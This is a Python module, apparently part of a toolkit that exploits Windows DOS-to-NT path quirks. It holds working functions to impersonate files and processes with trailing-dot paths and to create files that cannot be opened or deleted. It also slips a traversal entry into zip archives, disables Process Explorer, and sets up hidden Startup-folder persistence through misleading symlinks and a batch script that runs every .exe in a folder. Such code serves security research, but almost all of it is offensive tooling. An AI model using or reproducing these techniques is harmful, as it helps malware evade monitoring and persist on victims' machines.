import tempfile
import os
import shutil
import zipfile
from pathlib import Path
from ctypes.wintypes import HANDLE

from magic_dot.nt_create_user_process.nt_create_user_process import nt_create_user_process, PROCESS_CREATE_FLAGS_CREATE_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
from magic_dot.reparse_points.reparse_points import create_ntfs_symlink
from magic_dot.file_utils import nt_path, nt_makedirs, set_short_name, get_short_name, dos_path

WINDOWS_AUTOSTART_PATH_IN_USER_HOME = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
USER_HOME_PATH = str(Path.home())
AUTOSTART_PATH = os.path.join(USER_HOME_PATH, WINDOWS_AUTOSTART_PATH_IN_USER_HOME)

INOPERABLE_NAME = "..."

STARTUP_BAT_PROXY_SCRIPT_CONTENT = r"""
@echo off

for %%a in (*.exe) do (
  start %%a
)
"""


def generate_impersonated_path(path: str, near: bool) -> str:
    impersonated_path = ""
    if near:
        impersonated_path = f"{path}."
    else:
        target_file_path_split = path.split("\\")
        top_level_directory = os.path.join(f"{target_file_path_split[0]}\\", target_file_path_split[1])
        under_top_level_directory = os.path.join(*target_file_path_split[2:])
        impersonated_path = os.path.join(f"{top_level_directory}.", under_top_level_directory)
    
    return nt_path(impersonated_path)

def generate_inoperable_path(parent_dir_path: str):
    parent_dir_abs_path = os.path.abspath(parent_dir_path)
    inoperable_path = nt_path(os.path.join(parent_dir_abs_path, INOPERABLE_NAME))
    
    while os.path.exists(inoperable_path):
        inoperable_path += "."

    return inoperable_path

def create_inoperable_file(parent_dir_path: str, copy_from: str = None) -> str:
    inoperable_file_path = generate_inoperable_path(parent_dir_path)

    if copy_from != None:
        copy_from_abs_path = os.path.abspath(copy_from)
        shutil.copyfile(copy_from_abs_path, inoperable_file_path)
    else:
        open(inoperable_file_path, "wb").close()

    return inoperable_file_path


def create_inoperable_dir(parent_dir_path: str, copy_from: str = None):
    inoperable_dir_path = generate_inoperable_path(parent_dir_path)

    if copy_from:
        copy_from_abs_path = os.path.abspath(copy_from)
        shutil.copytree(copy_from_abs_path, inoperable_dir_path)
    else:
        os.mkdir(inoperable_dir_path)

    return inoperable_dir_path


def create_impersonated_file(target_file: str, copy_from: str = None, near: bool = False, use_existing_short_name: bool = False, use_specific_short_name: str = None) -> str:
    target_file_abs_path = os.path.abspath(target_file)
    
    if use_specific_short_name != None:
        set_short_name(target_file_abs_path, use_specific_short_name)

    if use_specific_short_name or use_existing_short_name:
        target_file_abs_path = get_short_name(target_file_abs_path)

    impersonated_file_path = generate_impersonated_path(target_file_abs_path, near)
    nt_makedirs(os.path.dirname(impersonated_file_path))

    if copy_from:
        copy_from_abs_path = os.path.abspath(copy_from)
        shutil.copyfile(copy_from_abs_path, impersonated_file_path)
    else:
        open(impersonated_file_path, "wb").close()
    
    return impersonated_file_path

    
def create_impersonated_dir(target_dir: str, copy_from: str = None, near: bool = False, use_existing_short_name: bool = False, use_specific_short_name: str = None) -> str:
    target_dir_abs_path = os.path.abspath(target_dir)

    if use_specific_short_name != None:
        set_short_name(target_dir_abs_path, use_specific_short_name)

    if use_specific_short_name or use_existing_short_name:
        target_dir_abs_path = get_short_name(target_dir_abs_path)

    impersonated_dir_path = generate_impersonated_path(target_dir_abs_path, near)
    nt_makedirs(os.path.dirname(impersonated_dir_path))

    if copy_from:
        copy_from_abs_path = os.path.abspath(copy_from)
        shutil.copytree(copy_from_abs_path, impersonated_dir_path)
    else:
        os.mkdir(impersonated_dir_path)

    return impersonated_dir_path


def create_impersonated_process(impersonate_to_path: str, exe_path: str) -> HANDLE:
    impersonated_file_path = create_impersonated_file(impersonate_to_path, exe_path, False)
    return nt_create_user_process(impersonated_file_path, os.path.abspath(dos_path(impersonate_to_path)))


def add_invisible_file_to_zip(zip_file_path: str, file_path: str):
    zip_file_abs_path = os.path.abspath(zip_file_path)
    file_abs_path = os.path.abspath(file_path)
    with zipfile.ZipFile(zip_file_abs_path, "a") as zip:
        zip.write(file_abs_path, f"..\\{os.path.basename(file_abs_path)}")


def disable_procexp():
    temp_path = tempfile.gettempdir()
    disabling_process_path = os.path.join(temp_path, "a" * 255)
    cmd_exe_path = os.path.expandvars(r"%systemroot%\System32\cmd.exe")
    shutil.copyfile(cmd_exe_path, nt_path(disabling_process_path))
    nt_create_user_process(disabling_process_path, hide_console_window=True)


# def is_untraceable_startup_folder(folder_path: str):
#     for file_name in os.listdir(folder_path):
#         file_path = os.path.join(folder_path, file_name)
#         try:
#             with open(file_path, "r") as f:
#                 bat_file_content = f.read()
#         except UnicodeDecodeError:
#             # means it's not a textual file (like the BAT file we are looking for)
#             continue
#         if bat_file_content == STARTUP_BAT_PROXY_SCRIPT:
#             return True
    
#     return False


def create_misleading_autostart_link(target_file_path: str, autostart_file_name: str):
    # Requires the "Create Symbolic Links" user right or "Developer Mode" enabled
    home = str(Path.home())
    autostart_path = os.path.join(home, WINDOWS_AUTOSTART_PATH_IN_USER_HOME)

    symlink_to_target_name = f"{autostart_file_name}."
    symlink_to_target_path = os.path.join(autostart_path, symlink_to_target_name)
    symlink_to_symlink_name = autostart_file_name

    create_ntfs_symlink(nt_path(symlink_to_target_path), target_file_path)

    backup_cwd = os.getcwd()
    os.chdir(autostart_path)
    create_ntfs_symlink(symlink_to_symlink_name, symlink_to_target_name, relative=True)
    os.chdir(backup_cwd)


def create_untraceable_startup_folder(folder_path: str, proxy_bat_file_name: str):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    proxy_bat_file_name_no_ext = Path(proxy_bat_file_name).stem
    proxy_bat_file_path = os.path.join(folder_path, proxy_bat_file_name_no_ext)
    with open(proxy_bat_file_path, "w") as f:
        f.write(STARTUP_BAT_PROXY_SCRIPT_CONTENT)
    
    create_misleading_autostart_link(proxy_bat_file_path, f"{proxy_bat_file_name_no_ext}.bat")

    




